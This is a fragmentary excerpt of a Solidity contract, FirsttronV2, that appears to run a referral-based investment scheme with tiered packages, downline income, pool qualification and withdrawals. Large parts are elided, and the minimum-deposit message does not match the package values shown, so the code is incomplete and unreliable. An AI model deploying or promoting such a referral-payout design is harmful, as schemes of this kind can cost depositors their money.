...
contract FirsttronV2 {
    ...
    uint256[5] public defaultPackages = [5 ether,400 ether,1000 ether ,2000 ether,4000 ether];
  ...
  function _refPayout(address _addr, uint256 _amount) internal {
    ...
    function invest(address referrer) public payable {
		...
		require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 200 MATIC');
        ...
        _usersDownlineIncomeDistribution(msg.sender,msgValue);
            ...
            //firstPool Qualify
            if(users[user.referrer].refs[0] >= 4 && users[user.referrer].totalWithdrawn < 4 ether && users[user.referrer].checkpoint + 4 days >= block.timestamp){
  ...
  function withdrawal() external{
    ...
    if(poolEligible[msg.sender] && _user.totalWithdrawn >= 4 ether){
